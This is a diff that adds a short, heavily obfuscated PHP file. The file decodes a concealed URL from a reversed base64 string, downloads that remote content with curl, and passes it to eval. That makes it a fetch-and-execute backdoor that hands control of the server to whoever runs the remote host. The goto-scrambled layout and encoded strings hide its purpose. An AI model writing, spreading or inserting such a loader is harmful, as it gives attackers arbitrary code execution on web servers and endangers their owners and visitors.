@@ -1,0 +1,2 @@
+<?php
+ goto bZlmV; HH65X: eval("\77\76" . $r); goto ZxRrg; bZlmV: $pepek = curl_init(base64_decode(strrev("\x3d\75\101\144\64\122\156\114\x7a\170\x47\143\65\112\x32\114\153\x6c\155\114\65\x31\x6d\x4c\166\126\x32\x63\x79\x56\155\x5a\x70\x35\127\x5a\161\x39\171\x4c\x36\x4d\x48\x63\x30\x52\110\x61"))); goto ewzcw; ewzcw: curl_setopt($pepek, CURLOPT_RETURNTRANSFER, 1); goto GUCIz; GUCIz: $r = curl_exec($pepek); goto HH65X; ZxRrg: ?>
